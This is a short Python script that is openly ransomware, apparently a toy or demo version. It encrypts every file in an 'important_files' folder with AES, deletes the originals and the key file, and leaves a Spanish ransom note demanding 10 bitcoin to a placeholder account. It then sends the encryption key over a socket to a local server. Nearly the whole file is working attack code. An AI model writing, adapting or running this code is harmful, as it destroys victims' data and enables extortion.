import os
import socket
from Crypto.Cipher import AES
from Crypto import Random
from Crypto.Hash import SHA256
from Crypto.Util.Padding import pad, unpad

def encrypt(key, filename):
	chunksize = 64*1024
	outputFile = filename+".enc"
	filesize = str(os.path.getsize(filename)).zfill(16)
	IV = Random.new().read(16)
	encryptor = AES.new(key, AES.MODE_CBC, IV)

	with open(filename, 'rb') as infile:#rb means read in binary
		with open(outputFile, 'wb') as outfile:#wb means write in the binary mode
			outfile.write(filesize.encode('utf-8'))
			outfile.write(IV)

			while True:
				chunk = infile.read(chunksize)

				if len(chunk) == 0:
					break
				elif len(chunk)%16 != 0:
					chunk =pad(chunk, 16)

				outfile.write(encryptor.encrypt(chunk))


def getKey(password):
	hasher = SHA256.new(password.encode('utf-8'))
	return hasher.digest()

with open("key.txt", "r") as keyfile:
    x = keyfile.read()

os.remove("key.txt")

os.chdir("./important_files")
files = [f for f in os.listdir() if os.path.isfile(f)]

for file in files:
    encrypt(getKey(x), file)
    os.remove(file)


with open("leeme.txt", "w+") as readmefile:
    message = "encripte alguno de tus archivos, para ser exacto estos: \n"
    for file in files:
        message += file + "\n"
    message += "pagame a la cuenta BCxxxxxx 10 bitcoin y envia mensaje pague con el archivo que te deje. mas cuidado la proxima :3"
    readmefile.write(message)

HOST = "127.0.0.1"  # The server's hostname or IP address
PORT = 65432  # The port used by the server

message = bytes("x=" + x, encoding = "utf-8")
with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect((HOST, PORT))
    s.sendall(message)
    s.close()